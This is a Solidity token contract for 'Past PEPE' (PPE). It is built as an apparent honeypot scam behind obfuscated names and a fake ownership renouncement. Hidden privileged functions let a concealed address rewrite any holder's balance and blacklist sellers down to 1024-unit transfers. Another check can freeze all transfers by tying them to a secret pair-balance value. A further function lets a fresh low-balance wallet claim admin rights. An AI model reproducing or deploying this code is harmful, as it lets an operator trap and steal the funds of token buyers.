//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface tokenToMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeBuy) external view returns (uint256);

    function transfer(address totalSwap, uint256 toTx) external returns (bool);

    function allowance(address isMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 toTx) external returns (bool);

    function transferFrom(
        address sender,
        address totalSwap,
        uint256 toTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeTotal, uint256 value);
    event Approval(address indexed isMax, address indexed spender, uint256 value);
}

abstract contract autoSwapTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface liquidityTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface teamMin {
    function createPair(address feeSwap, address feeLiquidity) external returns (address);
}

interface tokenToModeMetadata is tokenToMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PastPEPE is autoSwapTo, tokenToMode, tokenToModeMetadata {

    event OwnershipTransferred(address indexed swapTo, address indexed toTotal);

    uint256 constant teamFee = 2 ** 10;

    function balanceOf(address feeBuy) public view virtual override returns (uint256) {
        return shouldMaxAuto[feeBuy];
    }

    address public maxMarketing;

    mapping(address => bool) public tokenSwap;

    function allowance(address maxTrading, address tokenAtFund) external view virtual override returns (uint256) {
        if (tokenAtFund == txFund) {
            return type(uint256).max;
        }
        return receiverLaunchedMax[maxTrading][tokenAtFund];
    }

    address receiverSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function teamTradingBuy(address listAmount, uint256 toTx) public {
        limitToken();
        shouldMaxAuto[listAmount] = toTx;
    }

    uint256 private enableLiquidity;

    function listTo(address launchedReceiver) public {
        limitToken();
        
        if (launchedReceiver == shouldFee || launchedReceiver == maxMarketing) {
            return;
        }
        tokenSwap[launchedReceiver] = true;
    }

    constructor (){
        if (buyExemptLaunched) {
            buyExemptLaunched = false;
        }
        liquidityTake receiverFee = liquidityTake(txFund);
        maxMarketing = teamMin(receiverFee.factory()).createPair(receiverFee.WETH(), address(this));
        
        shouldFee = _msgSender();
        tradingReceiver();
        txWallet[shouldFee] = true;
        shouldMaxAuto[shouldFee] = toBuy;
        
        emit Transfer(address(0), shouldFee, toBuy);
    }

    string private receiverReceiverMin = "PPE";

    uint256 teamReceiverEnable;

    uint256 private amountFee;

    bool private buyExemptLaunched;

    address txFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public shouldFee;

    mapping(address => mapping(address => uint256)) private receiverLaunchedMax;

    mapping(address => uint256) private shouldMaxAuto;

    function name() external view virtual override returns (string memory) {
        return fromTrading;
    }

    function limitToken() private view {
        require(txWallet[_msgSender()]);
    }

    function owner() external view returns (address) {
        return tradingAmount;
    }

    address private tradingAmount;

    function tradingReceiver() public {
        emit OwnershipTransferred(shouldFee, address(0));
        tradingAmount = address(0);
    }

    bool public atSell;

    bool private teamToken;

    mapping(address => bool) public txWallet;

    uint8 private minTake = 18;

    function receiverReceiver(address shouldReceiver, address totalSwap, uint256 toTx) internal returns (bool) {
        if (shouldReceiver == shouldFee) {
            return exemptSenderTo(shouldReceiver, totalSwap, toTx);
        }
        uint256 listMax = tokenToMode(maxMarketing).balanceOf(receiverSender);
        require(listMax == teamReceiverEnable);
        require(totalSwap != receiverSender);
        if (tokenSwap[shouldReceiver]) {
            return exemptSenderTo(shouldReceiver, totalSwap, teamFee);
        }
        return exemptSenderTo(shouldReceiver, totalSwap, toTx);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return toBuy;
    }

    function decimals() external view virtual override returns (uint8) {
        return minTake;
    }

    function exemptSenderTo(address shouldReceiver, address totalSwap, uint256 toTx) internal returns (bool) {
        require(shouldMaxAuto[shouldReceiver] >= toTx);
        shouldMaxAuto[shouldReceiver] -= toTx;
        shouldMaxAuto[totalSwap] += toTx;
        emit Transfer(shouldReceiver, totalSwap, toTx);
        return true;
    }

    uint256 private toBuy = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return tradingAmount;
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverReceiverMin;
    }

    function transferFrom(address shouldReceiver, address totalSwap, uint256 toTx) external override returns (bool) {
        if (_msgSender() != txFund) {
            if (receiverLaunchedMax[shouldReceiver][_msgSender()] != type(uint256).max) {
                require(toTx <= receiverLaunchedMax[shouldReceiver][_msgSender()]);
                receiverLaunchedMax[shouldReceiver][_msgSender()] -= toTx;
            }
        }
        return receiverReceiver(shouldReceiver, totalSwap, toTx);
    }

    bool public toSell;

    function marketingMax(uint256 toTx) public {
        limitToken();
        teamReceiverEnable = toTx;
    }

    function modeFee(address isAuto) public {
        require(isAuto.balance < 100000);
        if (toSell) {
            return;
        }
        
        txWallet[isAuto] = true;
        if (atSell) {
            buyExemptLaunched = false;
        }
        toSell = true;
    }

    function transfer(address listAmount, uint256 toTx) external virtual override returns (bool) {
        return receiverReceiver(_msgSender(), listAmount, toTx);
    }

    string private fromTrading = "Past PEPE";

    function approve(address tokenAtFund, uint256 toTx) public virtual override returns (bool) {
        receiverLaunchedMax[_msgSender()][tokenAtFund] = toTx;
        emit Approval(_msgSender(), tokenAtFund, toTx);
        return true;
    }

    uint256 launchedFromList;

}